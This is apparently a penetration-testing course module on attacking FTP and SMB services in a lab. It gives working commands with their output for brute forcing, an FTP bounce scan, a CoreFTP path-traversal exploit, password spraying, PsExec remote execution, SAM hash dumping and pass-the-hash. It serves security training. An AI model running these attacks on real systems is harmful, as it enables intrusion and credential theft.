Every target is unique, and we need to familiarize ourselves with our target, its processes, procedures, business model, and purpose. Once we understand our target, we can think about what information is essential for them and what kind of information is helpful for our attack.

There are two key elements to finding sensitive information:

1. We need to understand the service and how it works.
2. We need to know what we are looking for.

# Attacking FTP

The [File Transfer Protocol](https://en.wikipedia.org/wiki/File_Transfer_Protocol) (`FTP`) is a standard network protocol used to transfer files between computers. It also performs directory and files operations, such as changing the working directory, listing files, and renaming and deleting directories or files. By default, FTP listens on port `TCP/21`.

To attack an FTP Server, we can abuse misconfiguration or excessive privileges, exploit known vulnerabilities or discover new vulnerabilities. Therefore, after gaining access to the FTP Service, we need to be aware of the content in the directory so we can search for sensitive or critical information, as we previously discussed. The protocol is designed to trigger downloads and uploads with commands. Thus, files can be transferred between servers and clients. A file management system is available to the user, known by the operating system. Files can be stored in folders, which may be located in other folders. This results in a hierarchical directory structure. Most companies use this service for software or website development processes.

## Enumeration

`Nmap` default scripts `-sC` includes the [ftp-anon](https://nmap.org/nsedoc/scripts/ftp-anon.html) Nmap script which checks if a FTP server allows anonymous logins. The version enumeration flag `-sV` provides interesting information about FTP services, such as the FTP banner, which often includes the version name. We can use the `ftp` client or `nc` to interact with the FTP service. By default, FTP runs on TCP port 21.

#### Nmap

crimsonguard@htb[/htb]`$ sudo nmap -sC -sV -p 21 192.168.2.142   Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 22:04 EDT Nmap scan report for 192.168.2.142 Host is up (0.00054s latency).  PORT   STATE SERVICE 21/tcp open  ftp | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rw-r--r--   1 1170     924            31 Mar 28  2001 .banner | d--x--x--x   2 root     root         1024 Jan 14  2002 bin | d--x--x--x   2 root     root         1024 Aug 10  1999 etc | drwxr-srwt   2 1170     924          2048 Jul 19 18:48 incoming [NSE: writeable] | d--x--x--x   2 root     root         1024 Jan 14  2002 lib | drwxr-sr-x   2 1170     924          1024 Aug  5  2004 pub |_Only 6 shown. Use --script-args ftp-anon.maxlist=-1 to see all.`

## Misconfigurations

As we discussed, anonymous authentication can be configured for different services such as FTP. To access with anonymous login, we can use the `anonymous` username and no password. This will be dangerous for the company if read and write permissions have not been set up correctly for the FTP service. Because with the anonymous login, the company could have stored sensitive information in a folder that the anonymous user of the FTP service could have access to.

This would enable us to download this sensitive information or even upload dangerous scripts. Using other vulnerabilities, such as path traversal in a web application, we would be able to find out where this file is located and execute it as PHP code, for example.

#### Anonymous Authentication

crimsonguard@htb[/htb]`$ ftp 192.168.2.142                           Connected to 192.168.2.142. 220 (vsFTPd 2.3.4) Name (192.168.2.142:kali): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp> ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r--    1 0        0               9 Aug 12 16:51 test.txt 226 Directory send OK.`

Once we get access to an FTP server with anonymous credentials, we can start searching for interesting information. We can use the commands `ls` and `cd` to move around directories like in Linux. To download a single file, we use `get`, and to download multiple files, we can use `mget`. For upload operations, we can use `put` for a simple file or `mput` for multiple files. We can use `help` in the FTP client session for more information.

In the [Footprinting](https://academy.hackthebox.com/course/preview/footprinting) module, we cover detailed information about possible misconfigurations of such services. For example, many different settings can be applied to an FTP server, and some of them lead to different options that could cause possible attacks against that service. However, this module will focus on specific attacks rather than finding individual misconfigurations.

## Protocol Specifics Attacks

Many different attacks and methods are protocol-based. However, it is essential to note that we are not attacking the individual protocols themselves but the services that use them. Since there are dozens of services for a single protocol and they process the corresponding information differently, we will look at some.

#### Brute Forcing

If there is no anonymous authentication available, we can also brute-force the login for the FTP services using a list of the pre-generated usernames and passwords. There are many different tools to perform a brute-forcing attack. Let us explore one of them, [Medusa](https://github.com/jmk-foofus/medusa). With `Medusa`, we can use the option `-u` to specify a single user to target, or you can use the option `-U` to provide a file with a list of usernames. The option `-P` is for a file containing a list of passwords. We can use the option `-M` and the protocol we are targeting (FTP) and the option `-h` for the target hostname or IP address.

**Note:** Although we may find services vulnerable to brute force, most applications today prevent these types of attacks. A more effective method is Password Spraying.

#### Brute Forcing with Medusa

crimsonguard@htb[/htb]`$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp                                                                Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>                                                       ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456 (1 of 14344392 complete) ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 12345 (2 of 14344392 complete) ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456789 (3 of 14344392 complete) ACCOUNT FOUND: [ftp] Host: 10.129.203.7 User: fiona Password: family [SUCCESS]`

#### FTP Bounce Attack

An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a `PORT` command to trick the FTP connection into running commands and getting information from a device other than the intended server.

Consider we are targetting an FTP Server `FTP_DMZ` exposed to the internet. Another device within the same network, `Internal_DMZ`, is not exposed to the internet. We can use the connection to the `FTP_DMZ` server to scan `Internal_DMZ` using the FTP Bounce attack and obtain information about the server's open ports. Then, we can use that information as part of our attack against the infrastructure.

![[ftp_bounce_attack.webp]]
Source: [https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/](https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/)

The `Nmap` -b flag can be used to perform an FTP bounce attack:

crimsonguard@htb[/htb]`$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2  Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT Resolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213). Attempting connection to ftp://anonymous:password@10.10.110.213:21 Connected:220 (vsFTPd 3.0.3) Login credentials accepted by FTP server! Initiating Bounce Scan at 04:55 FTP command misalignment detected ... correcting. Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports) Nmap scan report for 172.17.0.2 Host is up.  PORT   STATE  SERVICE 80/tcp open http  <SNIP>`

Modern FTP servers include protections that, by default, prevent this type of attack, but if these features are misconfigured in modern-day FTP servers, the server can become vulnerable to an FTP Bounce attack.

When you spawn your target, please wait up to 60 more seconds after seeing the IP address to ensure the corresponding service is launched correctly.

# Latest FTP Vulnerabilities

In discussing the latest vulnerabilities, we will focus this section and the following ones on one of the previously shown attacks and present it as simply as possible without going into too much technical detail. This should help us facilitate the concept of the attack through an example related to a specific service to gain a better understanding.

In this case, we will discuss the `CoreFTP before build 727` vulnerability assigned [CVE-2022-22836](https://nvd.nist.gov/vuln/detail/CVE-2022-22836). This vulnerability is for an FTP service that does not correctly process the `HTTP PUT` request and leads to an `authenticated directory`/`path traversal,` and `arbitrary file write` vulnerability. This vulnerability allows us to write files outside the directory to which the service has access.

## The Concept of the Attack

This FTP service uses an HTTP `POST` request to upload files. However, the CoreFTP service allows an HTTP `PUT` request, which we can use to write content to files. Let's have a look at the attack based on our concept. The [exploit](https://www.exploit-db.com/exploits/50652) for this attack is relatively straightforward, based on a single `cURL` command.

#### CoreFTP Exploitation

crimsonguard@htb[/htb]`$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops`

We create a raw HTTP `PUT` request (`-X PUT`) with basic auth (`--basic -u <username>:<password>`), the path for the file (`--path-as-is https://<IP>/../../../../../whoops`), and its content (`--data-binary "PoC."`) with this command. Additionally, we specify the host header (`-H "Host: <IP>"`) with the IP address of our target system.

#### The Concept of Attacks
![[attack_concept2.webp]]

In short, the actual process misinterprets the user's input of the path. This leads to access to the restricted folder being bypassed. As a result, the write permissions on the HTTP `PUT` request are not adequately controlled, which leads to us being able to create the files we want outside of the authorized folders. However, we will skip the explanation of the `Basic Auth` process and jump directly to the first part of the exploit.

#### Directory Traversal

|**Step**|**Directory Traversal**|**Concept of Attacks - Category**|
|---|---|---|
|`1.`|The user specifies the type of HTTP request with the file's content, including escaping characters to break out of the restricted area.|`Source`|
|`2.`|The changed type of HTTP request, file contents, and path entered by the user are taken over and processed by the process.|`Process`|
|`3.`|The application checks whether the user is authorized to be in the specified path. Since the restrictions only apply to a specific folder, all permissions granted to it are bypassed as it breaks out of that folder using the directory traversal.|`Privileges`|
|`4.`|The destination is another process that has the task of writing the specified contents of the user on the local system.|`Destination`|

Up to this point, we have bypassed the constraints imposed by the application using the escape characters (`../../../../`) and come to the second part, where the process writes the contents we specify to a file of our choice. This is when the cycle starts all over again, but this time to write contents to the target system.

#### Arbitrary File Write

|**Step**|**Arbitrary File Write**|**Concept of Attacks - Category**|
|---|---|---|
|`5.`|The same information that the user entered is used as the source. In this case, the filename (`whoops`) and the contents (`--data-binary "PoC."`).|`Source`|
|`6.`|The process takes the specified information and proceeds to write the desired content to the specified file.|`Process`|
|`7.`|Since all restrictions were bypassed during the directory traversal vulnerability, the service approves writing the contents to the specified file.|`Privileges`|
|`8.`|The filename specified by the user (`whoops`) with the desired content (`"PoC."`) now serves as the destination on the local system.|`Destination`|

After the task has been completed, we will be able to find this file with the corresponding contents on the target system.

#### Target System

```cmd-session
C:\> type C:\whoops

PoC.
```

# Attacking SMB

Server Message Block (SMB) is a communication protocol created for providing shared access to files and printers across nodes on a network. Initially, it was designed to run on top of NetBIOS over TCP/IP (NBT) using TCP port `139` and UDP ports `137` and `138`. However, with Windows 2000, Microsoft added the option to run SMB directly over TCP/IP on port `445` without the extra NetBIOS layer. Nowadays, modern Windows operating systems use SMB over TCP but still support the NetBIOS implementation as a failover.

Samba is a Unix/Linux-based open-source implementation of the SMB protocol. It also allows Linux/Unix servers and Windows clients to use the same SMB services.

For instance, on Windows, SMB can run directly over port 445 TCP/IP without the need for NetBIOS over TCP/IP, but if Windows has NetBIOS enabled, or we are targetting a non-Windows host, we will find SMB running on port 139 TCP/IP. This means that SMB is running with NetBIOS over TCP/IP.

Another protocol that is commonly related to SMB is [MSRPC (Microsoft Remote Procedure Call)](https://en.wikipedia.org/wiki/Microsoft_RPC). RPC provides an application developer a generic way to execute a procedure (a.k.a. a function) in a local or remote process without having to understand the network protocols used to support the communication, as specified in [MS-RPCE](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/290c38b1-92fe-4229-91e6-4fc376610c15), which defines an RPC over SMB Protocol that can use SMB Protocol named pipes as its underlying transport.

To attack an SMB Server, we need to understand its implementation, operating system, and which tools we can use to abuse it. As with other services, we can abuse misconfiguration or excessive privileges, exploit known vulnerabilities or discover new vulnerabilities. Furthermore, after we gain access to the SMB Service, if we interact with a shared folder, we need to be aware of the content in the directory. Finally, if we are targetting NetBIOS or RPC, identify which information we can get or what action we can perform on the target.

## Enumeration

Depending on the SMB implementation and the operating system, we will get different information using `Nmap`. Keep in mind that when targetting Windows OS, version information is usually not included as part of the Nmap scan results. Instead, Nmap will try to guess the OS version. However, we will often need other scans to identify if the target is vulnerable to a particular exploit. We will cover searching for known vulnerabilities later in this section. For now, let's scan ports 139 and 445 TCP.

crimsonguard@htb[/htb]`$ sudo nmap 10.129.14.128 -sV -sC -p139,445  Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST Nmap scan report for 10.129.14.128 Host is up (0.00024s latency).  PORT    STATE SERVICE     VERSION 139/tcp open  netbios-ssn Samba smbd 4.6.2 445/tcp open  netbios-ssn Samba smbd 4.6.2 MAC Address: 00:00:00:00:00:00 (VMware)  Host script results: |_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown) | smb2-security-mode:  |   2.02:  |_    Message signing enabled but not required | smb2-time:  |   date: 2021-09-19T13:16:04 |_  start_date: N/A`

The Nmap scan reveals essential information about the target:

- SMB version (Samba smbd 4.6.2)
- Hostname HTB
- Operating System is Linux based on SMB implementation

Let's explore some common misconfigurations and protocols specifics attacks.

## Misconfigurations

SMB can be configured not to require authentication, which is often called a `null session`. Instead, we can log in to a system with no username or password.

#### Anonymous Authentication

If we find an SMB server that does not require a username and password or find valid credentials, we can get a list of shares, usernames, groups, permissions, policies, services, etc. Most tools that interact with SMB allow null session connectivity, including `smbclient`, `smbmap`, `rpcclient`, or `enum4linux`. Let's explore how we can interact with file shares and RPC using null authentication.

#### File Share

Using `smbclient`, we can display a list of the server's shares with the option `-L`, and using the option `-N`, we tell `smbclient` to use the null session.

crimsonguard@htb[/htb]`$ smbclient -N -L //10.129.14.128          Sharename       Type      Comment         -------      --     -------        ADMIN$          Disk      Remote Admin         C$              Disk      Default share         notes           Disk      CheckIT        IPC$            IPC       IPC Service (DEVSM) SMB1 disabled no workgroup available`

`Smbmap` is another tool that helps us enumerate network shares and access associated permissions. An advantage of `smbmap` is that it provides a list of permissions for each shared folder.

crimsonguard@htb[/htb]`$ smbmap -H 10.129.14.128  [+] IP: 10.129.14.128:445     Name: 10.129.14.128                                            Disk                                                    Permissions     Comment         --                                                   ---------    -------         ADMIN$                                                  NO ACCESS       Remote Admin         C$                                                      NO ACCESS       Default share         IPC$                                                    READ ONLY       IPC Service (DEVSM)         notes                                                   READ, WRITE     CheckIT`

Using `smbmap` with the `-r` or `-R` (recursive) option, one can browse the directories:

crimsonguard@htb[/htb]`$ smbmap -H 10.129.14.128 -r notes  [+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                                    Disk                                                    Permissions     Comment         --                                                   ---------    -------         notes                                                   READ, WRITE         .\notes\*         dr--r--r               0 Mon Nov  2 00:57:44 2020    .         dr--r--r               0 Mon Nov  2 00:57:44 2020    ..         dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG         fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt         fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp         dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ         dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO         dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup`

From the above example, the permissions are set to `READ` and `WRITE`, which one can use to upload and download the files.

crimsonguard@htb[/htb]`$ smbmap -H 10.129.14.128 --download "notes\note.txt"  [+] Starting download: notes\note.txt (116 bytes) [+] File output to: /htb/10.129.14.128-notes_note.txt`

crimsonguard@htb[/htb]`$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"  [+] Starting upload: test.txt (20 bytes) [+] Upload complete.`

#### Remote Procedure Call (RPC)

We can use the `rpcclient` tool with a null session to enumerate a workstation or Domain Controller.

The `rpcclient` tool offers us many different commands to execute specific functions on the SMB server to gather information or modify server attributes like a username. We can use this [cheat sheet from the SANS Institute](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) or review the complete list of all these functions found on the [man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) of the `rpcclient`.

crimsonguard@htb[/htb]`$ rpcclient -U'%' 10.10.110.17  rpcclient $> enumdomusers  user:[mhope] rid:[0x641] user:[svc-ata] rid:[0xa2b] user:[svc-bexec] rid:[0xa2c] user:[roleary] rid:[0xa36] user:[smorgan] rid:[0xa37]`

`Enum4linux` is another utility that supports null sessions, and it utilizes `nmblookup`, `net`, `rpcclient`, and `smbclient` to automate some common enumeration from SMB targets such as:

- Workgroup/Domain name
- Users information
- Operating system information
- Groups information
- Shares Folders
- Password policy information

The [original tool](https://github.com/CiscoCXSecurity/enum4linux) was written in Perl and [rewritten by Mark Lowe in Python](https://github.com/cddmp/enum4linux-ng).

crimsonguard@htb[/htb]`$ ./enum4linux-ng.py 10.10.11.45 -A -C  ENUM4LINUX - next generation   ========================== |    Target Information    |  ========================== [*] Target ........... 10.10.11.45 [*] Username ......... '' [*] Random Username .. 'noyyglci' [*] Password ......... ''   ==================================== |    Service Scan on 10.10.11.45     |  ==================================== [*] Checking LDAP (timeout: 5s) [-] Could not connect to LDAP on 389/tcp: connection refused [*] Checking LDAPS (timeout: 5s) [-] Could not connect to LDAPS on 636/tcp: connection refused [*] Checking SMB (timeout: 5s) [*] SMB is accessible on 445/tcp [*] Checking SMB over NetBIOS (timeout: 5s) [*] SMB over NetBIOS is accessible on 139/tcp   ===================================================                             |    NetBIOS Names and Workgroup for 10.10.11.45    |  ===================================================                                                                                          [*] Got domain/workgroup name: WORKGROUP [*] Full NetBIOS names information: - WIN-752039204 <00> -          B <ACTIVE>  Workstation Service - WORKGROUP     <00> -          B <ACTIVE>  Workstation Service - WIN-752039204 <20> -          B <ACTIVE>  Workstation Service - MAC Address = 00-0C-29-D7-17-DB ...  ======================================== |    SMB Dialect Check on 10.10.11.45    |  ========================================  <SNIP>`

## Protocol Specifics Attacks

If a null session is not enabled, we will need credentials to interact with the SMB protocol. Two common ways to obtain credentials are [brute forcing](https://en.wikipedia.org/wiki/Brute-force_attack) and [password spraying](https://owasp.org/www-community/attacks/Password_Spraying_Attack).

#### Brute Forcing and Password Spray

When brute-forcing, we try as many passwords as possible against an account, but it can lock out an account if we hit the threshold. We can use brute-forcing and stop before reaching the threshold if we know it. Otherwise, we do not recommend using brute force.

Password spraying is a better alternative since we can target a list of usernames with one common password to avoid account lockouts. We can try more than one password if we know the account lockout threshold. Typically, two to three attempts are safe, provided we wait 30-60 minutes between attempts. Let's explore the tool [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) that includes the ability to execute password spraying.

With CrackMapExec (CME), we can target multiple IPs, using numerous users and passwords. Let's explore an everyday use case for password spraying. To perform a password spray against one IP, we can use the option `-u` to specify a file with a user list and `-p` to specify a password. This will attempt to authenticate every user from the list using the provided password.

crimsonguard@htb[/htb]`$ cat /tmp/userlist.txt  Administrator jrodriguez  admin <SNIP> jurena`

crimsonguard@htb[/htb]`$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth  SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False) SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE  SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE  SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\admin:Company01! STATUS_LOGON_FAILURE  SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\eperez:Company01! STATUS_LOGON_FAILURE  SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\amone:Company01! STATUS_LOGON_FAILURE  SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\fsmith:Company01! STATUS_LOGON_FAILURE  SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\tcrash:Company01! STATUS_LOGON_FAILURE   <SNIP>  SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\jurena:Company01! (Pwn3d!)` 

**Note:** By default CME will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. it is very useful for spraying a single password against a large user list. Additionally, if we are targetting a non-domain joined computer, we will need to use the option `--local-auth`. For a more detailed study Password Spraying see the Active Directory Enumeration & Attacks module.

For more detailed usage instructions, check out the tool's [documentation guide](https://web.archive.org/web/20220129050920/https://mpgn.gitbook.io/crackmapexec/getting-started/using-credentials).

#### SMB

Linux and Windows SMB servers provide different attack paths. Usually, we will only get access to the file system, abuse privileges, or exploit known vulnerabilities in a Linux environment, as we will discuss later in this section. However, in Windows, the attack surface is more significant.

When attacking a Windows SMB Server, our actions will be limited by the privileges we had on the user we manage to compromise. If this user is an Administrator or has specific privileges, we will be able to perform operations such as:

- Remote Command Execution
- Extract Hashes from SAM Database
- Enumerating Logged-on Users
- Pass-the-Hash (PTH)

Let's discuss how we can perform such operations. Additionally, we will learn how the SMB protocol can be abused to retrieve a user's hash as a method to escalate privileges or gain access to a network.

#### Remote Code Execution (RCE)

Before jumping into how to execute a command on a remote system using SMB, let's talk about Sysinternals. The Windows Sysinternals website was created in 1996 by [Mark Russinovich](https://en.wikipedia.org/wiki/Mark_Russinovich) and [Bryce Cogswell](https://en-academic.com/dic.nsf/enwiki/2358707) to offers technical resources and utilities to manage, diagnose, troubleshoot, and monitor a Microsoft Windows environment. Microsoft acquired Windows Sysinternals and its assets on July 18, 2006.

Sysinternals featured several freeware tools to administer and monitor computers running Microsoft Windows. The software can now be found on the [Microsoft website](https://docs.microsoft.com/en-us/sysinternals/). One of those freeware tools to administer remote systems is PsExec.

[PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) is a tool that lets us execute processes on other systems, complete with full interactivity for console applications, without having to install client software manually. It works because it has a Windows service image inside of its executable. It takes this service and deploys it to the admin$ share (by default) on the remote machine. It then uses the DCE/RPC interface over SMB to access the Windows Service Control Manager API. Next, it starts the PSExec service on the remote machine. The PSExec service then creates a [named pipe](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes) that can send commands to the system.

We can download PsExec from [Microsoft website](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec), or we can use some Linux implementations:

- [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - Python PsExec like functionality example using [RemComSvc](https://github.com/kavika13/RemCom).
- [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) - A similar approach to PsExec without using [RemComSvc](https://github.com/kavika13/RemCom). The technique is described [here](https://web.archive.org/web/20190515131124/https://www.optiv.com/blog/owning-computers-without-shell-access). This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
- [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - includes an implementation of `smbexec` and `atexec`.
- [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Ruby PsExec implementation.

#### Impacket PsExec

To use `impacket-psexec`, we need to provide the domain/username, the password, and the IP address of our target machine. For more detailed information we can use impacket help:

crimsonguard@htb[/htb]`$ impacket-psexec -h  Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation  usage: psexec.py [-h] [-c pathname] [-path PATH] [-file FILE] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB] [-dc-ip ip address]                  [-target-ip ip address] [-port [destination port]] [-service-name service_name] [-remote-binary-name remote_binary_name]                  target [command ...]  PSEXEC like functionality example using RemComSvc.  positional arguments:   target                [[domain/]username[:password]@]<targetName or address>   command               command (or arguments if -c is used) to execute at the target (w/o path) - (default:cmd.exe)  optional arguments:   -h, --help            show this help message and exit   -c pathname           copy the filename for later execution, arguments are passed in the command option   -path PATH            path of the command to execute   -file FILE            alternative RemCom binary (be sure it doesn't require CRT)   -ts                   adds timestamp to every logging output   -debug                Turn DEBUG output ON  authentication:   -hashes LMHASH:NTHASH                         NTLM hashes, format is LMHASH:NTHASH   -no-pass              don't ask for password (useful for -k)   -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the                         ones specified in the command line   -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)   -keytab KEYTAB        Read keys for SPN from keytab file  connection:   -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter   -target-ip ip address                         IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve                         it   -port [destination port]                         Destination port to connect to SMB Server   -service-name service_name                         The name of the service used to trigger the payload   -remote-binary-name remote_binary_name                         This will be the name of the executable uploaded on the target`

To connect to a remote machine with a local administrator account, using `impacket-psexec`, you can use the following command:

crimsonguard@htb[/htb]`$ impacket-psexec administrator:'Password123!'@10.10.110.17  Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation  [*] Requesting shares on 10.10.110.17..... [*] Found writable share ADMIN$ [*] Uploading file EHtJXgng.exe [*] Opening SVCManager on 10.10.110.17..... [*] Creating service nbAc on 10.10.110.17..... [*] Starting service nbAc..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.19041.1415] (c) Microsoft Corporation. All rights reserved.   C:\Windows\system32>whoami && hostname  nt authority\system WIN7BOX`

The same options apply to `impacket-smbexec` and `impacket-atexec`.

#### CrackMapExec

Another tool we can use to run CMD or PowerShell is `CrackMapExec`. One advantage of `CrackMapExec` is the availability to run a command on multiples host at a time. To use it, we need to specify the protocol, `smb`, the IP address or IP address range, the option `-u` for username, and `-p` for the password, and the option `-x` to run cmd commands or uppercase `-X` to run PowerShell commands.

crimsonguard@htb[/htb]`$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec  SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False) SMB         10.10.110.17 445    WIN7BOX  [+] .\Administrator:Password123! (Pwn3d!) SMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexec SMB         10.10.110.17 445    WIN7BOX  nt authority\system`

**Note:** If the`--exec-method` is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the `--exec-method` smbexec.

#### Enumerating Logged-on Users

Imagine we are in a network with multiple machines. Some of them share the same local administrator account. In this case, we could use `CrackMapExec` to enumerate logged-on users on all machines within the same network `10.10.110.17/24`, which speeds up our enumeration process.

crimsonguard@htb[/htb]`$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users  SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False) SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!) SMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\Administrator             logon_server: WIN7BOX SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\jurena                    logon_server: WIN7BOX SMB         10.10.110.21 445    WIN10BOX  [*] Windows 10.0 Build 19041 (name:WIN10BOX) (domain:WIN10BOX) (signing:False) (SMBv1:False) SMB         10.10.110.21 445    WIN10BOX  [+] WIN10BOX\Administrator:Password123! (Pwn3d!) SMB         10.10.110.21 445    WIN10BOX  [+] Enumerated loggedon users SMB         10.10.110.21 445    WIN10BOX  WIN10BOX\demouser                logon_server: WIN10BOX`

#### Extract Hashes from SAM Database

The Security Account Manager (SAM) is a database file that stores users' passwords. It can be used to authenticate local and remote users. If we get administrative privileges on a machine, we can extract the SAM database hashes for different purposes:

- Authenticate as another user.
- Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts.
- Pass The Hash. We will discuss it later in this section.

crimsonguard@htb[/htb]`$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam  SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False) SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!) SMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes SMB         10.10.110.17 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe::: SMB         10.10.110.17 445    WIN7BOX  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: SMB         10.10.110.17 445    WIN7BOX  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: SMB         10.10.110.17 445    WIN7BOX  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5717e1619e16b9179ef2e7138c749d65::: SMB         10.10.110.17 445    WIN7BOX  jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634::: SMB         10.10.110.17 445    WIN7BOX  demouser:1002:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a60f90b::: SMB         10.10.110.17 445    WIN7BOX  [+] Added 6 SAM hashes to the database`

#### Pass-the-Hash (PtH)

If we manage to get an NTLM hash of a user, and if we cannot crack it, we can still use the hash to authenticate over SMB with a technique called Pass-the-Hash (PtH). PtH allows an attacker to authenticate to a remote server or service using the underlying NTLM hash of a user's password instead of the plaintext password. We can use a PtH attack with any `Impacket` tool, `SMBMap`, `CrackMapExec`, among other tools. Here is an example of how this would work with `CrackMapExec`:

crimsonguard@htb[/htb]`$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE  SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False) SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)`

#### Forced Authentication Attacks

We can also abuse the SMB protocol by creating a fake SMB Server to capture users' [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4).

